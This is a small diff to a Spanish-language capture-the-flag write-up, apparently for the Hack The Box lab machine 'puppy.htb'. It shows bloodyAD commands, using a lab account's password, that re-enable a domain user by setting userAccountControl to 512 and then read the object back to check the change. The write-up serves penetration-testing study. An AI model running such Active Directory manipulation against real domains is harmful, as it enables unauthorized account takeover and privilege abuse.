@@ -284,7 +284,11 @@ Para reactivar la cuenta, simplemente debemos reescribir esa bandera: Establecer
 ./bloodyAD.py --host 10.10.11.70 -d 'puppy.htb' -u 'ant.edwards' -p 'Antman2025!' set object 'adam.silver' 'userAccountControl' -v 512
 ```
 
+```python
+bloodyAD --host 10.10.11.70 -d 'puppy.htb' -u 'ant.edwards' -p 'Antman2025!' get object 'adam.silver'
 
+# verificamos los cambios
+```
 
 ![[Pasted image 20250606183001.png]]
 
